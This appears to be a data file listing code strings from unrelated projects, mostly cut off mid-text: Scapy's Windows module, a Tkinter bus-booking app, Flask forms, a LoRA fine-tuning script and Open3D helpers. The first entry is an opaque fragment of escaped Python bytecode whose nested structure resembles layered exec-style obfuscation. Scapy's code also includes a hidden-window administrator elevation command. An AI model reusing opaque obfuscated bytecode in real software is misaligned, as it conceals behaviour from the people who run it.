00\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00d\\x01S\\x00)\\x03\\xe9\\x00\\x00\\x00\\x00Nsu\\xc9\\x00\\x00\\xe3\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xf3@\\x00\\x00\\x00\\x97\\x00d\\x00d\\x01l\\x00Z\\x00\\x02\\x00e\\x01\\x02\\x00e\\x00j\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00d\\x02\\xa6\\x01\\x00\\x00\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa6\\x01\\x00\\x00\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00d\\x01S\\x00)\\x03\\xe9\\x00\\x00\\x00\\x00Nst\\xc8\\x00\\x00\\xe3\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xf3@\\x00\\x00\\x00\\x97\\x00d\\x00d\\x01l\\x00Z\\x00\\x02\\x00e\\x01\\x02\\x00e\\x00j\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00d\\x02\\xa6\\x01\\x00\\x00\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa6\\x01\\x00\\x00\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00d\\x01S\\x00)\\x03\\xe9\\x00\\x00\\x00\\x00Nss\\xc7\\x00\\x00\\xe3\\x00\\x00\\x00\\x00",
    "# SPDX-License-Identifier: GPL-2.0-only\n# This file is part of Scapy\n# See https://scapy.net/ for more information\n# Copyright (C) Gabriel Potter <gabriel[]potter[]fr>\n\n\"\"\"\nCustomizations needed to support Microsoft Windows.\n\"\"\"\n\nfrom glob import glob\nimport os\nimport platform as platform_lib\nimport socket\nimport struct\nimport subprocess as sp\nimport warnings\n\nimport winreg\n\nfrom scapy.arch.windows.structures import (\n    _windows_title,\n    GetAdaptersAddresses,\n    GetIpForwardTable,\n    GetIpForwardTable2,\n    get_service_status,\n)\nfrom scapy.consts import WINDOWS, WINDOWS_XP\nfrom scapy.config import conf, ProgPath\nfrom scapy.error import (\n    Scapy_Exception,\n    log_interactive,\n    log_loading,\n    log_runtime,\n    warning,\n)\nfrom scapy.interfaces import NetworkInterface, InterfaceProvider, \\\n    dev_from_index, resolve_iface, network_name\nfrom scapy.pton_ntop import inet_ntop\nfrom scapy.utils import atol, itom, str2mac\nfrom scapy.utils6 import construct_source_candidate_set, in6_getscope\nfrom scapy.compat import plain_str\nfrom scapy.supersocket import SuperSocket\n\n# re-export\nfrom scapy.arch.common import get_if_raw_addr  # noqa: F401\n\n# Typing imports\nfrom typing import (\n    Any,\n    Dict,\n    Iterator,\n    List,\n    Optional,\n    Tuple,\n    Type,\n    Union,\n    cast,\n    overload,\n)\nfrom scapy.compat import Literal\n\nconf.use_pcap = True\n\n# These import must appear after setting conf.use_* variables\nfrom scapy.arch import libpcap  # noqa: E402\nfrom scapy.arch.libpcap import (  # noqa: E402\n    NPCAP_PATH,\n    PCAP_IF_UP,\n)\n\n# Detection happens after libpcap import (NPcap detection)\nNPCAP_LOOPBACK_NAME = r\"\\Device\\NPF_Loopback\"\nNPCAP_LOOPBACK_NAME_LEGACY = \"Npcap Loopback Adapter\"  # before npcap 0.9983\nif conf.use_npcap:\n    conf.loopback_name = NPCAP_LOOPBACK_NAME\nelse:\n    try:\n        if float(platform_lib.release()) >= 8.1:\n            conf.loopback_name = \"Microsoft KM-TEST Loopback Adapter\"\n        else:\n            conf.loopback_name = \"Microsoft Loopback Adapter\"\n    except ValueError:\n        conf.loopback_name = \"Microsoft Loopback Adapter\"\n\n# hot-patching socket for missing variables on Windows\nif not hasattr(socket, 'IPPROTO_IPIP'):\n    socket.IPPROTO_IPIP = 4  # type: ignore\nif not hasattr(socket, 'IP_RECVTTL'):\n    socket.IP_RECVTTL = 12  # type: ignore\nif not hasattr(socket, 'IPV6_HDRINCL'):\n    socket.IPV6_HDRINCL = 36  # type: ignore\n# https://github.com/python/cpython/issues/73701\nif not hasattr(socket, 'IPPROTO_IPV6'):\n    socket.IPPROTO_IPV6 = 41\nif not hasattr(socket, 'SOL_IPV6'):\n    socket.SOL_IPV6 = socket.IPPROTO_IPV6  # type: ignore\nif not hasattr(socket, 'IPPROTO_GRE'):\n    socket.IPPROTO_GRE = 47  # type: ignore\nif not hasattr(socket, 'IPPROTO_AH'):\n    socket.IPPROTO_AH = 51\nif not hasattr(socket, 'IPPROTO_ESP'):\n    socket.IPPROTO_ESP = 50\n\n_WlanHelper = NPCAP_PATH + \"\\\\WlanHelper.exe\"\n\n\ndef _encapsulate_admin(cmd):\n    # type: (str) -> str\n    \"\"\"Encapsulate a command with an Administrator flag\"\"\"\n    # To get admin access, we start a new powershell instance with admin\n    # rights, which will execute the command. This needs to be done from a\n    # powershell as we run it from a cmd.\n    # ! Behold !\n    return (\"powershell /command \\\"Start-Process cmd \"\n            \"-windowstyle hidden -Wait -PassThru -Verb RunAs \"\n            \"-ArgumentList '/c %s'\\\"\" % cmd)\n\n\ndef _get_npcap_config(param_key):\n    # type: (str) -> Optional[str]\n    \"\"\"\n    Get a Npcap parameter matching key in the registry.\n\n    List:\n    AdminOnly, DefaultFilterSettings, DltNull, Dot11Adapters, Dot11Support\n    LoopbackAdapter, LoopbackSupport, NdisImPlatformBindingOptions, VlanSupport\n    WinPcapCompatible\n    \"\"\"\n    hkey = winreg.HKEY_LOCAL_MACHINE\n    node = r\"SYSTEM\\CurrentControlSet\\Services\\npcap\\Parameters\"\n    try:\n        key = winreg.OpenKey(hkey, node)\n        dot11_adapters, _ = winreg.QueryValueEx(key, param_key)\n        winreg.CloseKey(key)\n    except WindowsError:\n        return None\n    return cast(str, dot11_adapters)\n\n\ndef _where(filename, dirs=None, env=\"PATH\"):\n    # type: (str, Optional[Any], str) -> str\n    \"\"\"Find file in current dir, in deep_lookup cache or in system path\"\"\"\n    if dirs is None:\n        dirs = []\n    if not isinstance(dirs, list):\n        dirs = [dirs]\n    if glob(filename):\n        return filename\n    paths = [os.curdir] + os.environ[env].split(os.path.pathsep) + dirs\n    try:\n        return next(os.path.normpath(match)\n                    for path in paths\n                    for match in glob(os.path.join(path, filename))\n                    if match)\n    except (StopIteration, RuntimeError):\n        raise IOError(\"File not found: %s\" % filename)\n\n\ndef win_find_exe(filename, installsubdir=None, env=\"ProgramFiles\"):\n    # type: (str, Optional[Any], str) -> str\n    \"\"\"Find executable in current dir, system path or in the\n    given ProgramFiles subdir, and retuen its absolute path.\n    \"\"\"\n    fns = [filename] if filename.endswith(\".exe\") else [filename + ",
    "import sqlite3\nimport tkinter as tk\nfrom tkinter import messagebox \nfrom tkinter import PhotoImage\nfrom tkinter import ttk\nfrom tkcalendar import DateEntry\ndef initialize_db():\n    conn = sqlite3.connect(\"bus_reservation.db\")\n    cursor = conn.cursor()\n    cursor.execute(\"PRAGMA foreign_keys = ON;\")\n    cursor.execute('''\n        CREATE TABLE IF NOT EXISTS operator (\n            opr_id TEXT PRIMARY KEY,\n            name TEXT,\n            address TEXT,\n            phone TEXT CHECK(length(phone) = 10),\n            email TEXT\n        )\n    ''')\n    cursor.execute('''\n        CREATE TABLE IF NOT EXISTS route (\n            r_id TEXT PRIMARY KEY,\n            s_name TEXT,\n            s_id TEXT,\n            e_name TEXT,\n            e_id TEXT\n        )\n    ''')\n\n    cursor.execute('''\n    CREATE TABLE IF NOT EXISTS bus (\n        bus_id TEXT PRIMARY KEY,\n        bus_type TEXT,\n        capacity INTEGER,\n        op_id TEXT NOT NULL,\n        route_id TEXT NOT NULL,\n        FOREIGN KEY (op_id) REFERENCES operator (opr_id) ON DELETE CASCADE ON UPDATE CASCADE,\n        FOREIGN KEY (route_id) REFERENCES route (r_id) ON DELETE CASCADE ON UPDATE CASCADE\n    )\n''')\n\n    cursor.execute('''\n        CREATE TABLE IF NOT EXISTS running (\n            b_id TEXT,\n            run_date DATE,\n            seat_avail INTEGER,\n            PRIMARY KEY (b_id, run_date),\n            FOREIGN KEY (b_id) REFERENCES bus (bus_id) ON DELETE CASCADE ON UPDATE CASCADE\n        )\n    ''')\n           \n    cursor.execute('''\n    CREATE TABLE IF NOT EXISTS booking (\n    booking_id INTEGER PRIMARY KEY AUTOINCREMENT,\n    b_id TEXT NOT NULL,\n    run_date DATE NOT NULL,\n    user_name TEXT NOT NULL,\n    contact TEXT NOT NULL,\n    seat_number INTEGER NOT NULL, -- Add this column for seat numbers\n    UNIQUE (b_id, run_date, seat_number), -- Ensure each seat is booked only once per bus run\n    UNIQUE (b_id, run_date), -- Ensure each user can book only once per bus run\n    FOREIGN KEY (b_id) REFERENCES bus (bus_id)\n);\n\n    ''')\n   \n    conn.commit()\n    conn.close()\ndef check_booking_gui():\n    # Main window for checking bookings\n    root = tk.Tk()\n    root.title(\"Check Booking\")\n    root.geometry(\"400x300\")\n\n    tk.Label(root, text=\"Check Booking\", font=(\"Arial\", 20, \"bold\")).pack(pady=10)\n\n    tk.Label(root, text=\"Enter Contact Number:\", font=(\"Arial\", 12)).pack(pady=5)\n    contact_entry = tk.Entry(root, font=(\"Arial\", 12), width=30)\n    contact_entry.pack(pady=5)\n\n    def check_booking():\n        contact = contact_entry.get().strip()\n        if not contact:\n            messagebox.showerror(\"Error\", \"Contact number is required!\")\n            return\n\n        try:\n            conn = sqlite3.connect(\"bus_reservation.db\")\n            cursor = conn.cursor()\n\n            # Query to check bookings by contact\n            cursor.execute(\"\"\"\n            SELECT \n                b.booking_id, b.b_id, b.run_date, b.user_name, b.seat_number, bus.bus_type \n            FROM \n                booking b\n            JOIN \n                bus ON b.b_id = bus.bus_id\n            WHERE \n                b.contact = ?;\n            \"\"\", (contact,))\n            bookings = cursor.fetchall()\n            conn.close()\n\n            if bookings:\n                display_bookings(bookings)\n            else:\n                messagebox.showinfo(\"No Bookings Found\", \"No bookings found for this contact number.\")\n        except Exception as e:\n            messagebox.showerror(\"Error\", f\"An error occurred: {e}\")\n\n    def display_bookings(bookings):\n        booking_window = tk.Toplevel(root)\n        booking_window.title(\"Booking Details\")\n        booking_window.geometry(\"600x300\")\n\n        tk.Label(booking_window, text=\"Your Bookings\", font=(\"Arial\", 16, \"bold\")).pack(pady=10)\n\n        columns = (\"Booking ID\", \"Bus ID\", \"Run Date\", \"User Name\", \"Seat Number\", \"Bus Type\")\n        tree = ttk.Treeview(booking_window, columns=columns, show=\"headings\", height=10)\n        tree.pack(fill=tk.BOTH, expand=True)\n\n        for col in columns:\n            tree.heading(col, text=col)\n            tree.column(col, width=100)\n\n        for booking in bookings:\n            tree.insert(\"\", tk.END, values=booking)\n\n        tk.Button(booking_window, text=\"Close\", font=(\"Arial\", 12), command=booking_window.destroy).pack(pady=10)\n\n    tk.Button(root, text=\"Check Booking\", font=(\"Arial\", 14, \"bold\"), command=check_booking, bg=\"blue\", fg=\"white\").pack(pady=20)\n\n    root.mainloop()\ndef find_bus_page():\n    # Main window\n    root = tk.Tk()\n    root.title(\"Find Bus\")\n    root.geometry(\"800x500\")\n\n    tk.Label(root, text=\"Find Bus\", font=(\"Arial\", 20, \"bold\")).pack(pady=10)\n\n    input_frame = tk.Frame(root)\n    input_frame.pack(pady=20)\n\n    tk.Label(input_frame, text=\"Source Name:\", font=(\"Arial\", 12)).grid(row=0, column=0, padx=10, pady=5, sticky=\"w\")\n    tk.Label(input_frame, text=\"Destination Name:\", font=(\"Arial\", 12)).grid(row=1, column=0, padx=10, pady=5, sticky=\"w\")\n    tk.Label(input_frame, text=\"Travel Date (YYYY-MM-DD):\", fo",
    "# forms.py\n\nfrom flask_wtf import FlaskForm\nfrom wtforms import StringField, PasswordField, SubmitField, BooleanField\nfrom wtforms.validators import DataRequired, Length, Email, EqualTo, ValidationError\nfrom models import User\n\nclass RegistrationForm(FlaskForm):\n    username = StringField('Username',\n                           validators=[DataRequired(), Length(min=2, max=20)])\n    email = StringField('Email',\n                        validators=[DataRequired(), Email()])\n    password = PasswordField('Password',\n                             validators=[DataRequired()])\n    confirm_password = PasswordField('Confirm Password',\n                                     validators=[DataRequired(), EqualTo('password')])\n    submit = SubmitField('Sign Up')\n\n    # Custom validators to check for existing users\n    def validate_username(self, username):\n        user = User.query.filter_by(username=username.data).first()\n        if user:\n            raise ValidationError('That username is taken. Please choose a different one.')\n\n    def validate_email(self, email):\n        user = User.query.filter_by(email=email.data).first()\n        if user:\n            raise ValidationError('That email is already registered. Please choose a different one.')\n\nclass LoginForm(FlaskForm):\n    email = StringField('Email',\n                        validators=[DataRequired(), Email()])\n    password = PasswordField('Password',\n                             validators=[DataRequired()])\n    remember = BooleanField('Remember Me')\n    submit = SubmitField('Login')\n",
    "#!/usr/bin/env python\n# coding: utf-8\nimport argparse\nfrom tqdm import tqdm\nimport numpy as np\nimport json\nimport os\nfrom datetime import datetime\nimport torch\nfrom trl import SFTTrainer\nfrom transformers import TrainingArguments\nfrom unsloth import is_bfloat16_supported\nfrom datetime import datetime\nfrom sklearn.metrics import accuracy_score\nfrom unsloth import FastLanguageModel\nfrom unsloth import is_bfloat16_supported\nfrom datasets import load_dataset\nimport wandb, os\n\n\nparser = argparse.ArgumentParser(description=\"Set parameters.\")\nparser.add_argument('--dataset_dir', type=str, help='Path to the dataset directory.', default=\"/home/jtan/LLM-QO/data\")\nparser.add_argument('--train_dataset_name', type=str, help='Name of the training dataset.', default=\"train.jsonl\")\nparser.add_argument('--valid_dataset_name', type=str, help='Name of the validation dataset.', default=\"valid.jsonl\")\nparser.add_argument('--test_dataset_name', type=str, help='Name of the testing dataset.', default=\"test.jsonl\")\nparser.add_argument('--max_steps', type=int, help='Max number of training steps.', default=1500)\nparser.add_argument('--save_steps', type=int, help='Number of save steps .', default=300)\nparser.add_argument('--llm_name', type=str, help='Name of the language model.', default=\"llama3-8b\")\nparser.add_argument('--max_new_tokens', type=int, help='The maximum numbers of tokens to generate.', default=128)\nparser.add_argument('--predict_dir', type=str, help='Name of the predict directory.', default=\"predicts_dsb\")\nparser.add_argument('--output_dir', type=str, help='Name of the output directory.', default=\"outputs_dsb\")\nparser.add_argument('--eval_mode', type=str, help='Whether only to eval.', default=\"false\")\nparser.add_argument('--train_run_name', type=str, help='Name of the train run.', default=\"train_run_name\")\n\nargs = parser.parse_args()\n\nprint(is_bfloat16_supported)\n\nmax_seq_length = 2048 # Choose any! We auto support RoPE Scaling internally!\ndtype = None # None for auto detection. Float16 for Tesla T4, V100, Bfloat16 for Ampere+\nload_in_4bit = True # Use 4bit quantization to reduce memory usage. Can be False.\n\n\nalpaca_prompt = \"\"\"Below is an instruction that describes a task, paired with an input that provides further context. Write a response that appropriately completes the request.\n\n### Instruction:\n{}\n\n### Input:\n{}\n\n### Response:\n{}\"\"\"\n\n\nif args.eval_mode == \"false\":\n    #Load base model: llama3-8b\n    # 4bit pre quantized models we support for 4x faster downloading + no OOMs.\n    fourbit_models = [\n        \"unsloth/mistral-7b-v0.3-bnb-4bit\",      # New Mistral v3 2x faster!\n        \"unsloth/mistral-7b-instruct-v0.3-bnb-4bit\",\n        \"unsloth/llama-3-8b-bnb-4bit\",           # Llama-3 15 trillion tokens model 2x faster!\n        \"unsloth/llama-3-8b-Instruct-bnb-4bit\",\n        \"unsloth/llama-3-70b-bnb-4bit\",\n        \"unsloth/Phi-3-mini-4k-instruct\",        # Phi-3 2x faster!\n        \"unsloth/Phi-3-medium-4k-instruct\",\n        \"unsloth/mistral-7b-bnb-4bit\",\n        \"unsloth/gemma-7b-bnb-4bit\",             # Gemma 2.2x faster!\n        #unsloth/llama-2-7b-bnb-4bit\n        #unsloth/codellama-7b-bnb-4bit\n    ] # More models at https://huggingface.co/unsloth\n\n    if args.llm_name == \"llama3-8b\":\n        llm_name = \"unsloth/llama-3-8b-bnb-4bit\"\n    elif args.llm_name == \"llama2-7b\":\n        llm_name = \"unsloth/llama-2-7b-bnb-4bit\"\n    elif args.llm_name == \"codellama-7b\":\n        llm_name = \"unsloth/codellama-7b-bnb-4bit\"\n    elif args.llm_name == \"mistral-7b\":\n        llm_name = \"unsloth/mistral-7b-v0.3-bnb-4bit\"\n    else:\n        print(\"Error model name!\")\n\n    model, tokenizer = FastLanguageModel.from_pretrained(\n        model_name = llm_name,\n        max_seq_length = max_seq_length,\n        dtype = dtype,\n        load_in_4bit = load_in_4bit,\n        # token = \"hf_...\", # use one if using gated models like meta-llama/Llama-2-7b-hf\n    )\n\n\n    model = FastLanguageModel.get_peft_model(\n        model,\n        r = 16, # Choose any number > 0 ! Suggested 8, 16, 32, 64, 128\n        target_modules = [\"q_proj\", \"k_proj\", \"v_proj\", \"o_proj\",\n                        \"gate_proj\", \"up_proj\", \"down_proj\",],\n        lora_alpha = 16,\n        lora_dropout = 0, # Supports any, but = 0 is optimized\n        bias = \"none\",    # Supports any, but = \"none\" is optimized\n        # [NEW] \"unsloth\" uses 30% less VRAM, fits 2x larger batch sizes!\n        use_gradient_checkpointing = \"unsloth\", # True or \"unsloth\" for very long context\n        random_state = 3407,\n        use_rslora = False,  # We support rank stabilized LoRA\n        loftq_config = None, # And LoftQ\n    )\n\n\n    EOS_TOKEN = tokenizer.eos_token # Must add EOS_TOKEN\n    def formatting_prompts_func(examples):\n        instructions = examples[\"instruction\"]\n        inputs       = examples[\"input\"]\n        outputs      = examples[\"output\"]\n        texts = []\n        for instruction, input, output in zip(instructions, inputs, outputs):\n            # Must add EOS_TOKEN, otherwise your generati",
    "import os\nimport re\nfrom datetime import datetime\n\n# Path to your blogs folder\nblogs_dir = \"./\"\nreadme_file = \"README.md\"\n\n# Regular expressions to extract the title and datePublished from YAML front matter\ntitle_pattern = re.compile(r'title:\\s*\"(.*?)\"')\ndate_pattern = re.compile(r\"datePublished:\\s*(.*?)\\n\")\n\n# Collect blog metadata\nblogs = []\n\nfor blog in os.listdir(blogs_dir):\n    if blog.endswith(\".md\"):\n        blog_path = os.path.join(blogs_dir, blog)\n        with open(blog_path, \"r\") as file:\n            content = file.read()\n            title_match = title_pattern.search(content)\n            date_match = date_pattern.search(content)\n\n            if title_match and date_match:\n                title = title_match.group(1)\n                date_str = date_match.group(1).strip()\n\n                # Remove the timezone abbreviation (everything in parentheses)\n                date_str_cleaned = re.sub(r\"\\s*\\(.*\\)$\", \"\", date_str)\n\n                # Convert datePublished to a datetime object\n                try:\n                    print(date_str_cleaned)\n                    date_published = datetime.strptime(\n                        date_str_cleaned, \"%a %b %d %Y %H:%M:%S %Z%z\"\n                    )\n                except ValueError:\n                    print(f\"Invalid date format in {blog}: {date_str}\")\n                    continue\n\n                # Convert title to a filename-friendly format\n                new_filename = (\n                    re.sub(r\"[^\\w\\s-]\", \"\", title).replace(\" \", \"-\").lower() + \".md\"\n                )\n                new_file_path = os.path.join(blogs_dir, new_filename)\n\n                # Rename the file if necessary\n                if blog_path != new_file_path:\n                    os.rename(blog_path, new_file_path)\n\n                # Append metadata\n                blogs.append(\n                    {\"title\": title, \"date\": date_published, \"filename\": new_filename}\n                )\n\n# Sort blogs by datePublished (ascending order: oldest to latest)\nblogs.sort(key=lambda x: x[\"date\"])\n\n# Generate Table of Contents\ntoc = \"# Table of Contents\\n\\n\"\nfor idx, blog in enumerate(blogs, 1):\n    toc += f\"{idx}. [{blog['title']}]({blog['filename']})\\n\"\n\n# Append the TOC to the README.md\nwith open(readme_file, \"a\") as readme:  # Use \"a\" to append\n    readme.write(\"\\n\" + toc)  # Add a newline before the TOC for better formatting\n\nprint(\"File renaming, sorting, and Table of Contents appended successfully!\")\n",
    "\"\"\"\nThis file is used for generation of CSV files for integration test cases,\nand also for manual verification + generation of test case values,\nand a few other things.\n\nPLEASE NOTE:\n\nThis code is genuinely pretty bad and messy. \ud83d\ude05\nIt was rushed together to generate the test cases easily via the CLI.\nIt could be a lot nicer, I know.\n\"\"\"\nimport json\nimport os\nimport os.path as op\nimport re\nimport sys\nimport warnings\nfrom typing import NamedTuple\nfrom typing import Optional\nfrom typing import Protocol\n\nimport numpy as np\nimport pandas as pd\nimport rich_click as click\nimport yaml\nfrom statsmodels.multivariate.pca import PCA\nfrom tabulate import tabulate\n\n\n# Suppress iteritems warning\nwarnings.simplefilter(\"ignore\", category=FutureWarning)\n\n# No scientific notation\nnp.set_printoptions(suppress=True)\n\n\nDIR = op.dirname(__file__)\n\nDEFAULT_SIZE = 10_000\nDEFAULT_SEED = 9434874\n\n\nclass TestCase(NamedTuple):\n    df: pd.DataFrame\n    index_column: Optional[str] = None\n    weights: Optional[pd.Series] = None\n\n\nclass TestCaseCallable(Protocol):\n    def __call__(self, size: int, seed: int) -> TestCase:\n        ...\n\n\ndef collinear_matrix(size: int = DEFAULT_SIZE, seed: int = DEFAULT_SEED) -> TestCase:\n    rs = np.random.RandomState(seed=seed)\n    df = pd.DataFrame(index=range(size))\n    df[\"idx\"] = df.index\n    df[\"x1\"] = 2 + rs.normal(0, 1, size=size)\n    df[\"x2\"] = 1 - df[\"x1\"] + rs.normal(0, 3, size=size)\n    df[\"x3\"] = 3 + 2 * df[\"x2\"] + rs.normal(0, 1, size=size)\n    df[\"x4\"] = -3 + 0.5 * (df[\"x1\"] * df[\"x3\"]) + rs.normal(0, 1, size=size)\n    df[\"x5\"] = 4 + 0.5 * np.sin(3 * df[\"x2\"]) + rs.normal(0, 1, size=size)\n\n    weights = pd.Series([1, 3, 3, 2, 4], index=[\"x1\", \"x2\", \"x3\", \"x4\", \"x5\"])\n\n    return TestCase(df=df, index_column=\"idx\", weights=weights)\n\n\ndef generate_orthonormal_vectors(cols, rows):\n    def make_vector_orthogonal(v, basis):\n        for basis_vector in vectors:\n            projection = np.dot(v, basis_vector) / np.dot(basis_vector, basis_vector)\n            v -= projection * basis_vector\n        return v\n\n    vectors = []\n\n    for _ in range(cols):\n        v = np.random.normal(0, 1, size=rows)\n        v = make_vector_orthogonal(v, vectors)\n        vectors.append(v)\n\n    vectors = [(v - v.mean()) / v.std() for v in vectors]\n    return np.array(vectors)\n\n\ndef missing_data_matrix(size: int = DEFAULT_SIZE, seed: int = DEFAULT_SEED) -> TestCase:\n    cols = 8\n    rs = np.random.RandomState(seed=seed)\n    df = pd.DataFrame(index=range(size))\n\n    for c in range(cols):\n        df[f\"c{c}\"] = rs.normal(0, 1, size=size)\n\n    cov = np.array([[1.0 if i == j else 0.7 for i in range(cols)] for j in range(cols)])\n    new = df @ np.linalg.cholesky(cov).T\n    new.columns = df.columns\n\n\ndef write_sql_of_dataframe(df: pd.DataFrame) -> str:\n    rows = []\n    for row in df.itertuples():\n        cells = [\n            f\"  {getattr(row, c)!r} as {c}\"\n            for c in df.columns\n        ]\n        rows.append(\",\\n\".join(cells))\n    sql = \"\\nunion all\\n\".join([f\"select\\n{row}\" for row in rows])\n    return \"with expected as (\\n  \" + sql.replace(\"\\n\", \"\\n  \") + \"\\n)\\n\\nselect * from expected\"\n\n\nALL_TEST_CASES: dict[str, TestCaseCallable] = {\n    \"collinear_matrix\": collinear_matrix,\n}\n\n\ndef click_option_seed(**kwargs):\n    return click.option(\n        \"--seed\", \"-s\",\n        default=DEFAULT_SEED,\n        show_default=True,\n        help=\"Seed used to generate data.\",\n        **kwargs\n    )\n\n\ndef click_option_size(**kwargs):\n    return click.option(\n        \"--size\", \"-n\",\n        default=DEFAULT_SIZE,\n        show_default=True,\n        help=\"Number of rows to generate.\",\n        **kwargs\n    )\n\n\n@click.group(\"main\")\ndef cli():\n    \"\"\"CLI for manually testing the code base.\"\"\"\n\n\n@cli.command(\"pca\")\n@click.option(\"--table\", \"-t\",\n              required=True,\n              type=click.Choice(list(ALL_TEST_CASES.keys())),\n              help=\"Table to regress against.\")\n@click.option(\"--weights/--no-weights\",\n              default=False,\n              type=click.BOOL,\n              show_default=True,\n              help=\"If true, use weights. NOTE: Weights not currently supported in \")\n@click.option(\"--columns\", \"-c\",\n              default=None,\n              type=click.INT,\n              show_default=True,\n              help=\"Number of columns to use.\")\n@click.option(\"--demean/--no-demean\", \"-d\",\n              default=True,\n              type=click.BOOL,\n              show_default=True,\n              help=\"If true, demean the data in PCA() call.\")\n@click.option(\"--normalize/--no-normalize\",\n              default=True,\n              type=click.BOOL,\n              show_default=True,\n              help=\"If true, normalize the data in PCA() call.\")\n@click.option(\"--standardize/--no-standardize\",\n              default=True,\n              type=click.BOOL,\n              show_default=True,\n              help=\"If true, standardize the data in PCA() call.\")\n@click.option(\"--missing\", \"-m\",\n              default=None,\n              type=click.",
    "import open3d as o3d\nimport numpy as np\nimport cv2\nimport datetime\nimport os\n\n\ndef load_frame(color_path, depth_path, max_depth=4000):\n    color = cv2.imread(color_path, -1)\n\n    depth_img = cv2.imread(depth_path, -1)\n    depth = (depth_img / 65536 * max_depth).astype(np.float32)\n\n    return color, depth\n\n\ndef save_frame(frame, output_dir, is_depth=False, max_depth=4000):\n    '''save as 16-bit PNG images'''\n    timestamp = datetime.datetime.now().strftime(\"%Y%m%d-%H%M%S\")\n\n    if is_depth:\n        frame = frame / max_depth * 65536\n        dtype = np.uint16\n        filepath = os.path.join(output_dir, f\"depth_{timestamp}.png\")\n    else: \n        dtype = np.uint8\n        filepath = os.path.join(output_dir, f\"amplitude_{timestamp}.png\")\n    \n    cv2.imwrite(filepath, frame.astype(dtype))\n\n\ndef get_intrinsic(shape=(240,180), fov=70):\n\n    def calculate_fov(shape, fov):\n        aspect_ratio = shape[0] / shape[1]\n        fov_rad = np.deg2rad(fov)\n\n        hfov_rad = 2 * np.arctan(np.tan(fov_rad / 2) / np.sqrt(1 + (1 / aspect_ratio**2)))\n        vfov_rad = 2 * np.arctan(np.tan(fov_rad / 2) / np.sqrt(1 + aspect_ratio**2))\n\n        hfov = np.rad2deg(hfov_rad)\n        vfov = np.rad2deg(vfov_rad)\n        return [hfov, vfov]\n\n    fovs = calculate_fov(shape, fov)\n    width, height = shape\n\n    fx = width / (2 * np.tan(0.5 * np.pi * fovs[0] / 180))\n    fy = height / (2 * np.tan(0.5 * np.pi * fovs[1] / 180))\n    cx = width / 2\n    cy = height / 2\n\n    # K = np.array([[fx, 0, cx],\n    #               [0, fy, cy],\n    #               [0, 0, 1]])\n\n    camera_intrinsic = o3d.camera.PinholeCameraIntrinsic(width, height, fx, fy, cx, cy)\n    return camera_intrinsic\n\n\ndef create_frustum(height=4000, fov=65, aspect_ratio=4/3):\n    # frustum = o3d.geometry.AxisAlignedBoundingBox(min_bound=(-2000, -1500, 0), max_bound=(2000, 1500, -4000))\n\n    half_height = height\n    half_width = half_height * np.tan(np.radians(fov / 2))\n    half_depth = half_width / aspect_ratio\n\n    vertices = [\n        [0, 0, 0],  # Tip of the pyramid\n        [-half_width, -half_depth, -half_height],  # Base vertices\n        [half_width, -half_depth, -half_height],\n        [half_width, half_depth, -half_height],\n        [-half_width, half_depth, -half_height]\n    ]\n\n    lines = [\n        [0, 1], [0, 2], [0, 3], [0, 4],  # Edges from the tip to the base\n        [1, 2], [2, 3], [3, 4], [4, 1]   # Edges around the base\n    ]\n\n    colors = [[1, 0, 0] for _ in range(len(lines))]  # Red color for all lines\n\n    line_set = o3d.geometry.LineSet()\n    line_set.points = o3d.utility.Vector3dVector(vertices)\n    line_set.lines = o3d.utility.Vector2iVector(lines)\n    line_set.colors = o3d.utility.Vector3dVector(colors)\n    return line_set\n\n\ndef convert_distance_to_zdepth(depth, intrinsic):\n    height, width = depth.shape\n    fx = intrinsic.intrinsic_matrix[0, 0]\n    fy = intrinsic.intrinsic_matrix[1, 1]\n    cx = intrinsic.intrinsic_matrix[0, 2]\n    cy = intrinsic.intrinsic_matrix[1, 2]\n\n    x, y = np.meshgrid(np.arange(width), np.arange(height))\n    x = (x - cx) / fx\n    y = (y - cy) / fy\n\n    zdepth = (depth / np.sqrt(x**2 + y**2 + 1)).astype(np.float32)\n    return zdepth\n\n\ndef create_rgbd(color, depth):\n    color = cv2.cvtColor(color, cv2.COLOR_BGR2RGB)\n\n    depth_image = o3d.geometry.Image(depth)\n    color_image = o3d.geometry.Image(color)\n\n    rgbd_image = o3d.geometry.RGBDImage.create_from_color_and_depth(\n        color_image, depth_image, depth_scale=1.0, depth_trunc=4000.0, convert_rgb_to_intensity=False)\n\n    return rgbd_image\n\n\ndef filter_by_luminance(pcd, confidence=20):\n    green_channel = np.asarray(pcd.colors)[:, 1]\n    mask = green_channel >= (confidence / 255.0)\n    pcd = pcd.select_by_index(np.where(mask)[0])\n    return pcd\n\n\ndef create_visualizer(shape=(640,480), pointsize=2., bgcolor=(0, 0, 0)):\n    # vis = o3d.visualization.Visualizer()\n    vis = o3d.visualization.VisualizerWithKeyCallback()\n\n    vis.create_window(\"Point Cloud\", shape[0], shape[1])\n    render_option = vis.get_render_option()\n    render_option.point_size = pointsize\n    render_option.background_color = bgcolor\n\n    view_control = vis.get_view_control()\n    view_control.set_up([0, -1, 0])\n    view_control.set_front([0, 0, -1])\n    view_control.set_lookat([0, 0, 0])\n    return vis\n",
